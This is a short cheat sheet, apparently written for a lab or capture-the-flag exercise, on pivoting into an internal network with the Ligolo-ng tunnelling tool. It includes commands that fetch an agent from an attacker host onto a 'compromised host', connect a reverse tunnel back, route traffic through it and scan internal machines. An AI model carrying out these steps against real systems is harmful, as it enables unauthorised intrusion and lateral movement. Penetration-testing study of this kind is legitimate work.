
## 🚀 Ligolo-ng Pivoting Cheat Sheet

## 🔧 Install on Parrot OS (Proxy/Relay Server)

Parrot OS is Debian-based, so you can grab the latest precompiled binaries directly from GitHub. The current version is **0.8.2**.

bash

```bash
# Create a working directory
mkdir ~/ligolo-ng && cd ~/ligolo-ng

# Download the Linux proxy (your Parrot box)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

# Download the Linux agent (for deploying to other Linux hosts)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Download the Windows agent (amd64)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip

# Download the Windows agent (arm64, optional)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_arm64.zip

# Extract everything
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.8.2_windows_amd64.zip

# Make binaries executable
chmod +x proxy agent
```

---

## 🌐 Set Up the TUN Interface (run once per session)

bash

```bash
# Create the ligolo TUN interface (requires root)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Verify it's up
ip addr show ligolo
```

---

## 🚀 Start the Proxy on Parrot

bash

```bash
# Start with a self-signed cert on default port 11601
sudo ./proxy -selfcert

# Or bind to a specific interface/port
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```
### Phase 2: Delivery (Transfer to Target)

Transfer the agent from your Parrot machine to the compromised host (DMZ01).

Bash

```
wget http://10.10.15.65:8080/agent
```


---

### Phase 3: Establishing the Tunnel

**1. Start the Proxy (On Parrot):**

Bash

```
sudo ./ligolo-proxy -selfcert
```

**2. Connect the Agent (On Target):**

Bash

```
./agent -connect 10.10.15.65:11601 -ignore-cert
```

**3. Activate the Session (Inside Ligolo-Proxy Terminal):**

- Type `session`, then select your active agent (e.g., `1`).
    
- Type `start` to begin the relay.
    

---

### Phase 4: Routing & Access

Now you must tell your local OS to send internal traffic into the tunnel.

Bash

```
# Inside ligolo interface
autoroute

#Then select the interface ligolo that we created earlier.
```

**Verify the Connection:**

Bash

```
# Test the tunnel with a no-ping scan
nmap -Pn -p 22 172.16.119.10
```p